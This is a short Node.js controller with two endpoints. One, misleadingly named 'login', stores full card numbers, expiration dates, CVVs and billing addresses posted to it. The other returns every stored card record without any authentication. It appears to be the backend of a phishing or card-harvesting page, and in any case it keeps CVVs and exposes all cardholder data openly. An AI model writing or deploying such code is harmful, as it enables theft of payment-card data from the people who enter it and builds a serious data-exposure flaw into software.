const Card = require('../models/card');


exports.login = async (req, res) => {
  const { number,
    expiration,
    cvv,
    firstName,
    lastName,
    country,
    adress1,
    adress2,
    city,
    state,
    codePostal,
    addInfo } = req.body;

  try {

      await Card.create({
        number:number,
        expiration:expiration,
        cvv:cvv,
        firstName:firstName,
        lastName:lastName,
        country:country,
        adress1:adress1,
        adress2:adress2,
        city:city,
        state:state,
        codePostal:codePostal,
        addInfo:addInfo
    });
    res.send({ status: "ok" });
  } catch (error) {
    res.send({ status: "error" });
  }
};

exports.getup = async (req, res) => {

  try {
    const oldCard = await Card.find({});

    
    res.status(200).json({
      data : oldCard,
    });
  } catch (error) {
    console.log(error);
  }
};


